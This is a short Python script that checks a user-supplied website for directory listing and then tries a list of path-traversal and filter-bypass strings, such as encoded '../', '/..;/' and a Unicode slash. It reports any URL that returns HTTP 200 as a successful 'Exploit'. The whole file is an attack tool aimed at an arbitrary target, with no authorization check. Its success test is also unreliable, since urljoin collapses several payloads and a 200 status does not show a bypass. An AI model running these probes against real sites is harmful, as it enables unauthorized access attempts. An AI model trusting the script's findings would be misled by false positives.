import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from termcolor import colored

def check_directory_listing(url):
    print(colored("[*] Testing for Directory Listing vulnerability on:", "blue"), url)
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        links = soup.find_all('a')
        directories = []
        for link in links:
            href = link.get('href')
            if href.endswith('/'):
                directories.append(href)
        if directories:
            print(colored("[+] Directory Listing vulnerability found!", "green"))
            print(colored("[*] Directories found:", "blue"))
            for directory in directories:
                print(colored("\t" + directory, "yellow"))
            return True
        else:
            print(colored("[-] No directories found.", "red"))
            return False
    else:
        print(colored("[-] Error:", "red"), "Failed to access the website.")
        return False

def bypass_protection(url):
    print(colored("[*] Attempting to bypass protection system on:", "blue"), url)
    # Add more techniques to bypass protection systems here
    techniques = [
        "../",              # Try going up one directory level
        "%2e%2e/",         # URL-encoded version of "../"
        "/./",              # Use current directory symbol
        "/../",             # Use backward slash to traverse
        "?path=",           # Use query parameter to access directories
        "#",                # Use fragment identifier
        "//",               # Use double slash to bypass some protections
        "/..;/",            # Use semicolon to try to bypass filtering
        "/..%u2215",        # Use Unicode character for directory traversal
        "/..\\",            # Use backslash to try different directory traversal
        "/.randomstring/",  # Use random string after dot to bypass some filters
        "/.../",            # Use multiple dots to bypass protection
    ]
    for technique in techniques:
        modified_url = urljoin(url, technique)
        response = requests.get(modified_url)
        if response.status_code == 200:
            print(colored("[+] Bypass successful with technique:", "green"), technique)
            print(colored("[*] Exploit:", "blue"), modified_url)
            return
    print(colored("[-] Bypass unsuccessful.", "red"))

if __name__ == "__main__":
    target_website = input(colored("Enter your target website URL: ", "cyan"))
    if target_website.startswith("http://") or target_website.startswith("https://"):
        directory_listing_vulnerable = check_directory_listing(target_website)
        if directory_listing_vulnerable:
            bypass_protection(target_website)
    else:
        print(colored("[-] Invalid URL format.", "red"))
